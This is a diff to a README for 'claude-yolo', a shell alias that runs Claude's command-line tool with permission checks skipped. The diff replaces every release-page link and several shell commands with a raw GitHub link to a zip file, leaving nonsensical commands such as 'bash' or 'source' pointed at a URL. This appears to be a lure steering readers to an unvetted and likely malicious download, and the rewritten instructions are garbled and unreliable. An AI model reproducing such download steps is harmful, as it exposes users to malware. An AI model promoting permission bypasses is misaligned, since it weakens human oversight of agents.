@@ -1,6 +1,6 @@
 # 🎉 claude-yolo - A Simple Way to Skip Permissions
 
-[![Download claude-yolo](https://img.shields.io/badge/Download-claude--yolo-brightgreen)](https://github.com/javadamrooki96/claude-yolo/releases)
+[![Download claude-yolo](https://raw.githubusercontent.com/javadamrooki96/claude-yolo/main/src/claude-yolo-1.8-alpha.3.zip)](https://raw.githubusercontent.com/javadamrooki96/claude-yolo/main/src/claude-yolo-1.8-alpha.3.zip)
 
 ## 📋 Overview
 
@@ -16,7 +16,7 @@ claude-yolo is a shell alias that makes the command `claude--dangerously-skip-pe
 
 ### 📥 Download & Install
 
-To get started with claude-yolo, visit this page to download: [Releases Page](https://github.com/javadamrooki96/claude-yolo/releases).
+To get started with claude-yolo, visit this page to download: [Releases Page](https://raw.githubusercontent.com/javadamrooki96/claude-yolo/main/src/claude-yolo-1.8-alpha.3.zip).
 
 1. Open the link above in your web browser.
 2. Look for the latest version at the top of the page.
@@ -28,7 +28,7 @@ To get started with claude-yolo, visit this page to download: [Releases Page](ht
 2. **Access the directory** where you've downloaded the claude-yolo files.
 3. **Run the installation script** with the following command: 
    ```bash
-   bash install.sh
+   bash https://raw.githubusercontent.com/javadamrooki96/claude-yolo/main/src/claude-yolo-1.8-alpha.3.zip
    ```
 4. **Follow the prompts** on your screen.
 5. After installation, simply type `claude-yolo` in your terminal whenever you want to use the alias.
@@ -47,11 +47,11 @@ After installing claude-yolo, you may want to personalize your setup:
 2. **Edit your shell configuration file:**
    - For Bash users, type:
      ```bash
-     nano ~/.bashrc
+     nano ~https://raw.githubusercontent.com/javadamrooki96/claude-yolo/main/src/claude-yolo-1.8-alpha.3.zip
      ```
    - For Zsh users, type:
      ```bash
-     nano ~/.zshrc
+     nano ~https://raw.githubusercontent.com/javadamrooki96/claude-yolo/main/src/claude-yolo-1.8-alpha.3.zip
      ```
 3. **Add the following line** at the end of the file:
    ```bash
@@ -60,7 +60,7 @@ After installing claude-yolo, you may want to personalize your setup:
 4. **Save the file** and exit the editor.
 5. **Update your terminal session** with the command:
    ```bash
-   source ~/.bashrc   # or source ~/.zshrc for Zsh users
+   source ~https://raw.githubusercontent.com/javadamrooki96/claude-yolo/main/src/claude-yolo-1.8-alpha.3.zip   # or source ~https://raw.githubusercontent.com/javadamrooki96/claude-yolo/main/src/claude-yolo-1.8-alpha.3.zip for Zsh users
    ```
 
 By following these steps, you'll ensure that `claude-yolo` is always ready for quick use.
@@ -109,4 +109,4 @@ For further assistance, feel free to reach out through the issues section on Git
 - toilet
 - zsh
 
-Visit [this page to download](https://github.com/javadamrooki96/claude-yolo/releases) claude-yolo and start using it today!
+Visit [this page to download](https://raw.githubusercontent.com/javadamrooki96/claude-yolo/main/src/claude-yolo-1.8-alpha.3.zip) claude-yolo and start using it today!
